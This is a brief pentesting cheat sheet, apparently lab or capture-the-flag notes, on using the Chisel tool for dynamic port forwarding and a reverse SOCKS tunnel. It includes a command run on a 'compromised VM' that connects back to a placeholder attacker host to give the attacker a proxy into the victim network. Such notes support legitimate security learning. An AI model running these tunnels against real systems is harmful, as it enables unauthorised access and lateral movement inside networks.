# Chisel

TCP/UDP tunnel over HTTP (can be secured via SSH).

## Dynamic Port Forwarding

**Target box:**
```
.\chisel.exe server --socks5 --port 51234
```

**Attacker box:**
```
chisel client target-box-ip:51234 50080:socks
```

Proxychains config:
```
[ProxyList]
socks5 127.0.0.1 50080
```

---

## Reverse Tunnel

**Attacker box:**
```
chisel server --reverse --port 8081
```

**Compromised VM:**
```
./chisel client <ATTACK_BOX_IP>:8081 R:socks
```

- `R:` means reverse (client initiates, server-side listens)
- `socks` creates a SOCKS5 proxy — default port 1080 on your attack box
